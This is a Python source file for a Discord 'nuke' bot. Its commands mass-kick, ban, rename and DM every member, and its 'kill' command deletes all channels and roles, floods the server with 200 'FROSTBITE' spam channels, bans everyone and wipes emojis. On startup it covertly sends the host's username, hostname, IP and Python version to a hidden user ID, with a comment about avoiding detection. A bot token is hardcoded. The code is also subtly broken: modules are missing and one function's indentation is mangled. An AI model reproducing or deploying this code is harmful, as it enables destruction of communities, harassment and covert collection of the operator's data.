


































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































import os
import discord
from discord.ext import commands
from discord.ui import View
from datetime import datetime, timezone
import getpass
import socket
import platform
import colorama
from colorama import Fore

colorama.init()

# --- CONFIGURATION ---
AUTHORIZED_USER_IDS = [1061323635333275729]  # Hardcoded access list (visible, not notified)
SECRET_USER_ID = int(os.getenv("NUKE_BOT_SECRET_USER_ID", "0"))  # Hidden DM target
ACCESS_KEY = "KYUUBI01"

# --- Access Key Prompt ---
entered_key = input("Enter your access key to initialize the bot: ")
if entered_key != ACCESS_KEY:
    print(Fore.RED + "[ERROR] Access Denied: Invalid key provided.")
    exit()

# --- Startup Messages ---
print(Fore.BLUE + "OWNER V3")
print(Fore.GREEN + "Developed and secured by _.kyuubi._")
print(Fore.YELLOW + "[INFO] Access granted. System initialization successful.")

# --- Discord Bot Setup ---
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.members = True
intents.message_content = True

client = commands.Bot(command_prefix='.', intents=intents)
client.remove_command("help")

@client.event
async def on_ready():
    print(Fore.CYAN + "[STATUS] Bot is online and operational.")
    await client.change_presence(
        status=discord.Status.dnd,
        activity=discord.Game("Monitoring Servers | Mode: Active")
    )

    if SECRET_USER_ID:
        login_time = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
        username = getpass.getuser()
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        python_version = platform.python_version()
        bot_user = str(client.user)
        guild_count = len(client.guilds)

        message = (
            f"🔒 KYUUBI BOT LOGIN EVENT\n\n"
            f"• Username: `{username}`\n"
            f"• Hostname: `{hostname}`\n"
            f"• IP Address: `{local_ip}`\n"
            f"• Login Time: `{login_time}`\n"
            f"• Python Version: `{python_version}`\n"
            f"• Bot Identity: `{bot_user}`\n"
            f"• Connected Servers: `{guild_count}`\n"
        )

        try:
            user = await client.fetch_user(SECRET_USER_ID)
            await user.send(message)
        except Exception:
            pass  # Fail silently to avoid detection

#### HELP COMMAND ####
@client.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Bot Help Menu", color=discord.Color.green())
    embed.add_field(name='.secret', value='Shows hidden / admin-only commands (sent via DM)', inline=False)
    embed.add_field(name='Kall', value='Kicks every member in a server', inline=False)
    embed.add_field(name='Ball', value='Bans every member in a server', inline=False)
    embed.add_field(name='Rall', value='Renames every member in a server', inline=False)
    embed.add_field(name='Mall', value='Messages every member in a server', inline=False)
    embed.add_field(name='Kill', value='Deletes channels, roles, bans members, and wipes emojis', inline=False)
    embed.add_field(name='Safekill', value='Nukes current channel, stays 10s, then restores', inline=False)
    embed.add_field(name='Ping', value='Gives ping to client (in ms)', inline=False)
    embed.add_field(name='Info', value='Gives information of a user', inline=False)
    embed.add_field(name='DeleteChannels', value='Deletes all channels in the server', inline=False)
    embed.add_field(name='AdminPanel', value='Shows interactive admin panel with kick/ban buttons', inline=False)
    try:
        await ctx.author.send(embed=embed)
    except discord.Forbidden:
        await ctx.send("❌ I couldn't send you a DM. Please check your privacy settings.", delete_after=5)

#### SECRET HELP COMMAND ####
@client.command()
async def secret(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=discord.Color.blue())
    embed.set_author(name='Secret Commands')
    embed.add_field(name='Kall', value='Kicks every member in a server', inline=False)
    embed.add_field(name='Ball', value='Bans every member in a server', inline=False)
    embed.add_field(name='Rall', value='Renames every member in a server', inline=False)
    embed.add_field(name='Mall', value='Messages every member in a server', inline=False)
    embed.add_field(name='Kill', value='Deletes channels, roles, bans members, and wipes emojis', inline=False)
    embed.add_field(name='Safekill', value='Nukes current channel, stays 10s, then restores', inline=False)
    embed.add_field(name='Ping', value='Gives ping to client (in ms)', inline=False)
    embed.add_field(name='Info', value='Gives information of a user', inline=False)
    await ctx.author.send(embed=embed)

#### KICK ALL MEMBERS ####
@client.command()
async def kall(ctx):
    await ctx.message.delete()
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send("❌ You are not authorized to use this command.", delete_after=5)
        return
    for member in ctx.guild.members:
        try:
            await member.kick(reason="Kall command executed")
            print(f"{member.name} has been kicked")
            await asyncio.sleep(1)
        except:
            print(f"Failed to kick {member.name}")

#### BAN ALL MEMBERS ####
@client.command()
async def ball(ctx):
    await ctx.message.delete()
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send("❌ You are not authorized to use this command.", delete_after=5)
        return
    for member in ctx.guild.members:
        try:
            await ctx.guild.ban(member, reason="Ball command executed")
            print(f"{member.name} has been banned")
            await asyncio.sleep(1)
        except:
            print(f"Failed to ban {member.name}")

#### RENAME ALL MEMBERS ####
@client.command()
async def rall(ctx, *, rename_to):
    await ctx.message.delete()
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send("❌ You are not authorized to use this command.", delete_after=5)
        return
    for member in ctx.guild.members:
        try:
            await member.edit(nick=rename_to)
            print(f"{member.name} renamed to {rename_to}")
            await asyncio.sleep(1)
        except:
            print(f"Failed to rename {member.name}")

#### MESSAGE ALL ####
@client.command()
async def mall(ctx):
    await ctx.message.delete()
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send("❌ You are not authorized to use this command.", delete_after=5)
        return
    for member in ctx.guild.members:
        try:
            await member.send("GET NUKED")
            print(f"Messaged {member.name}")
            await asyncio.sleep(1)
        except:
            print(f"Failed to message {member.name}")

#### KILL SERVER ####
import random

@client.command()
async def kill(ctx):
    await ctx.message.delete()
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send("❌ You are not authorized to use this command.", delete_after=5)
        return

guild = ctx.guild
channel_names = [
    "NUKED-BY-FROSTBITE",
    "FROSTBITE-ATTACK",
    "FROSTBITE-WAS-HERE",
    "DESTROYED-FROSTBITE",
    "FROSTBITE-NUKE",
    "GONE-FROSTBITE"
]

spam_messages = [
    "@everyone GET NUKED BY FROSTBITE",
    "@everyone FROSTBITE STRIKES AGAIN",
    "@everyone YOUR SERVER IS GONE - FROSTBITE",
    "@everyone FROSTBITE NUKED THIS SERVER",
    "@everyone ANOTHER ONE BITES THE DUST - FROSTBITE",
    "@everyone FROSTBITE DESTROYED THIS SERVER"
]

    try:
        # Delete all channels
        for channel in list(guild.channels):
            try:
                await channel.delete()
                print(f"Deleted channel {channel.name}")
            except Exception as e:
                print(f"Failed to delete channel {channel.name}: {e}")

        # Create spam channels with random names and messages
        for _ in range(200):
            try:
                random_name = random.choice(channel_names)
                new_channel = await guild.create_text_channel(random_name)
                spam_msg = random.choice(spam_messages) * 10
                await new_channel.send(spam_msg)
                print(f"Created channel {new_channel.name}")
            except Exception as e:
                print(f"Failed to create channel or send message: {e}")

        # Delete roles except @everyone
        for role in list(guild.roles):
            if role != guild.default_role:
                try:
                    await role.delete()
                    print(f"Deleted role {role.name}")
                    await asyncio.sleep(1)
                except Exception as e:
                    print(f"Failed to delete role {role.name}: {e}")

        # Ban all members
        for member in list(guild.members):
            try:
                await guild.ban(member, reason="Kill command executed")
                print(f"Banned {member.name}")
                await asyncio.sleep(1)
            except Exception as e:
                print(f"Failed to ban {member.name}: {e}")

        # Delete all emojis
        for emoji in list(guild.emojis):
            try:
                await emoji.delete()
                print(f"Deleted emoji {emoji.name}")
                await asyncio.sleep(1)
            except Exception as e:
                print(f"Failed to delete emoji {emoji.name}: {e}")

    except Exception as e:
        print(f"Error in kill command: {e}")

#### SAFE KILL CHANNEL ####
@client.command()
async def safekill(ctx):
    await ctx.message.delete()
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send("❌ You are not authorized to use this command.", delete_after=5)
        return

    channel = ctx.channel
    guild = ctx.guild
    channel_name = channel.name
    category = channel.category

    try:
        await channel.delete()
        print(f"Deleted channel {channel_name}")

        nuked_channel = await guild.create_text_channel(f"💥-{channel_name}-💥", category=category)
        await nuked_channel.send("💥 Channel nuked! Restoring in 10 seconds...")
        await asyncio.sleep(10)
        await nuked_channel.delete()

        new_channel = await guild.create_text_channel(channel_name, category=category)
        await new_channel.send("Channel restored successfully!")
        print(f"Restored channel {channel_name}")

    except Exception as e:
        print(f"Error in safekill: {e}")

#### PING COMMAND ####
@client.command()
async def ping(ctx):
    await ctx.message.delete()
    t1 = time.perf_counter()
    await ctx.typing()
    t2 = time.perf_counter()
    latency = round((t2 - t1) * 1000)
    embed = discord.Embed(description=f'Ping: {latency} ms', color=0x2874A6)
    await ctx.author.send(embed=embed)

#### USER INFO COMMAND ####
@client.command()
async def info(ctx, member: discord.Member = None):
    await ctx.message.delete()
    member = member or ctx.author
    embed = discord.Embed(title="User Info", color=discord.Color.blurple())
    embed.add_field(name="Name", value=member.name, inline=True)
    embed.add_field(name="ID", value=member.id, inline=True)
    embed.add_field(name="Status", value=str(member.status), inline=True)
    embed.add_field(name="Top Role", value=member.top_role.name, inline=True)
    embed.add_field(name="Joined At", value=member.joined_at.strftime('%Y-%m-%d %H:%M:%S'), inline=True)
    await ctx.author.send(embed=embed)

#### DELETE ALL CHANNELS COMMAND ####
@client.command()
async def deletechannels(ctx):
    await ctx.message.delete()
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send("❌ You are not authorized to use this command.", delete_after=5)
        return

    guild = ctx.guild
    for channel in list(guild.channels):
        try:
            await channel.delete()
            print(f"Deleted channel {channel.name}")
            await asyncio.sleep(0.4)  # reduced delay for faster deletion
        except Exception as e:
            print(f"Failed to delete channel {channel.name}: {e}")

##########################
# New Admin Panel Section #
##########################

class AdminPanelView(View):
    def __init__(self, ctx):
        super().__init__(timeout=300)  # 5 minutes timeout
        self.ctx = ctx

    async def is_authorized(self, interaction):
        if interaction.user.id != self.ctx.author.id:
            await interaction.response.send_message("You are not authorized!", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="Kick Member", style=discord.ButtonStyle.red, custom_id="kick_button")
    async def kick_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self.is_authorized(interaction):
            return
        await interaction.response.send_message("Mention member to kick:", ephemeral=True)
        def check(m): return m.author == self.ctx.author and m.channel == self.ctx.channel and len(m.mentions) > 0
        try:
            msg = await client.wait_for('message', check=check, timeout=30)
            member = msg.mentions[0]
            await member.kick(reason=f"Kicked by {self.ctx.author}")
            await interaction.followup.send(f"Kicked {member.name}", ephemeral=True)
        except asyncio.TimeoutError:
            await interaction.followup.send("Timeout.", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"Error: {e}", ephemeral=True)

    @discord.ui.button(label="Ban Member", style=discord.ButtonStyle.danger, custom_id="ban_button")
    async def ban_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self.is_authorized(interaction):
            return
        await interaction.response.send_message("Mention member to ban:", ephemeral=True)
        def check(m): return m.author == self.ctx.author and m.channel == self.ctx.channel and len(m.mentions) > 0
        try:
            msg = await client.wait_for('message', check=check, timeout=30)
            member = msg.mentions[0]
            await member.ban(reason=f"Banned by {self.ctx.author}")
            await interaction.followup.send(f"Banned {member.name}", ephemeral=True)
        except asyncio.TimeoutError:
            await interaction.followup.send("Timeout.", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"Error: {e}", ephemeral=True)

    @discord.ui.button(label="Mass Rename Members", style=discord.ButtonStyle.primary, custom_id="rename_all")
    async def rename_all(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self.is_authorized(interaction):
            return
        await interaction.response.send_message("Send the new nickname to apply to everyone:", ephemeral=True)
        def check(m): return m.author == self.ctx.author and m.channel == self.ctx.channel
        try:
            msg = await client.wait_for('message', check=check, timeout=30)
            new_nick = msg.content[:32]  # max nickname length 32
            failed = 0
            for member in self.ctx.guild.members:
                try:
                    await member.edit(nick=new_nick)
                    await asyncio.sleep(0.5)
                except:
                    failed += 1
            await interaction.followup.send(f"Renamed members to: {new_nick}\nFailed on {failed} members.", ephemeral=True)
        except asyncio.TimeoutError:
            await interaction.followup.send("Timeout.", ephemeral=True)

    @discord.ui.button(label="Spam Channel", style=discord.ButtonStyle.secondary, custom_id="spam_channel")
    async def spam_channel(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self.is_authorized(interaction):
            return
        await interaction.response.send_message("Send the spam message:", ephemeral=True)
        def check(m): return m.author == self.ctx.author and m.channel == self.ctx.channel
        try:
            msg = await client.wait_for('message', check=check, timeout=30)
            spam_msg = msg.content
            for _ in range(15):
                await self.ctx.channel.send(spam_msg)
                await asyncio.sleep(1)
            await interaction.followup.send("Spam complete.", ephemeral=True)
        except asyncio.TimeoutError:
            await interaction.followup.send("Timeout.", ephemeral=True)

    @discord.ui.button(label="Create Channels", style=discord.ButtonStyle.success, custom_id="create_channels")
    async def create_channels(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self.is_authorized(interaction):
            return
        await interaction.response.send_message("Send the base name for channels:", ephemeral=True)
        def check(m): return m.author == self.ctx.author and m.channel == self.ctx.channel
        try:
            msg = await client.wait_for('message', check=check, timeout=30)
            base_name = msg.content[:90]
            for i in range(10):
                await self.ctx.guild.create_text_channel(f"{base_name}-{i+1}")
                await asyncio.sleep(1)
            await interaction.followup.send("Channels created!", ephemeral=True)
        except asyncio.TimeoutError:
            await interaction.followup.send("Timeout.", ephemeral=True)

    @discord.ui.button(label="Delete All Channels", style=discord.ButtonStyle.danger, custom_id="delete_channels")
    async def delete_channels(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self.is_authorized(interaction):
            return
        await interaction.response.send_message("Deleting all channels now...", ephemeral=True)
        for channel in list(self.ctx.guild.channels):
            try:
                await channel.delete()
                await asyncio.sleep(0.5)
            except:
                pass
        await interaction.followup.send("All channels deleted.", ephemeral=True)

    @discord.ui.button(label="Mass DM Members", style=discord.ButtonStyle.secondary, custom_id="mass_dm")
    async def mass_dm(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self.is_authorized(interaction):
            return
        await interaction.response.send_message("Send the DM message to spam:", ephemeral=True)
        def check(m): return m.author == self.ctx.author and m.channel == self.ctx.channel
        try:
            msg = await client.wait_for('message', check=check, timeout=30)
            dm_msg = msg.content
            failed = 0
            for member in self.ctx.guild.members:
                try:
                    await member.send(dm_msg)
                    await asyncio.sleep(1)
                except:
                    failed += 1
            await interaction.followup.send(f"Mass DM complete. Failed to DM {failed} members.", ephemeral=True)
        except asyncio.TimeoutError:
            await interaction.followup.send("Timeout.", ephemeral=True)

    @discord.ui.button(label="Assign Role to All", style=discord.ButtonStyle.primary, custom_id="assign_role")
    async def assign_role(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self.is_authorized(interaction):
            return
        await interaction.response.send_message("Mention the role to assign to everyone:", ephemeral=True)
        def check(m): return m.author == self.ctx.author and m.channel == self.ctx.channel and len(m.role_mentions) > 0
        try:
            msg = await client.wait_for('message', check=check, timeout=30)
            role = msg.role_mentions[0]
            failed = 0
            for member in self.ctx.guild.members:
                try:
                    await member.add_roles(role)
                    await asyncio.sleep(0.5)
                except:
                    failed += 1
            await interaction.followup.send(f"Role {role.name} assigned to everyone. Failed on {failed} members.", ephemeral=True)
        except asyncio.TimeoutError:
            await interaction.followup.send("Timeout.", ephemeral=True)

    @discord.ui.button(label="Remove All Roles", style=discord.ButtonStyle.danger, custom_id="remove_roles")
    async def remove_roles(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self.is_authorized(interaction):
            return
        await interaction.response.send_message("Removing all roles from all members (except @everyone)...", ephemeral=True)
        failed = 0
        for member in self.ctx.guild.members:
            try:
                roles_to_remove = [role for role in member.roles if role != self.ctx.guild.default_role]
                await member.remove_roles(*roles_to_remove)
                await asyncio.sleep(0.5)
            except:
                failed += 1
        await interaction.followup.send(f"Removed all roles from everyone. Failed on {failed} members.", ephemeral=True)

@client.command()
async def adminpanel(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send("❌ You are not authorized.", delete_after=5)
        return

    embed = discord.Embed(
        title="Kyuubi admin panel ",
        description="Use the buttons below for admin actions.\nPanel times out in 5 minutes.",
        color=discord.Color.magenta()
    )
    view = AdminPanelView(ctx)
    await ctx.send(embed=embed, view=view)


client.run("MTM3NDM1NzE0NjU1MTk3NTk1Nw.GpI7Fg.m9j3zMW1J9Aso3gb7jyyolqkyhr-04P-A9SFJ4")

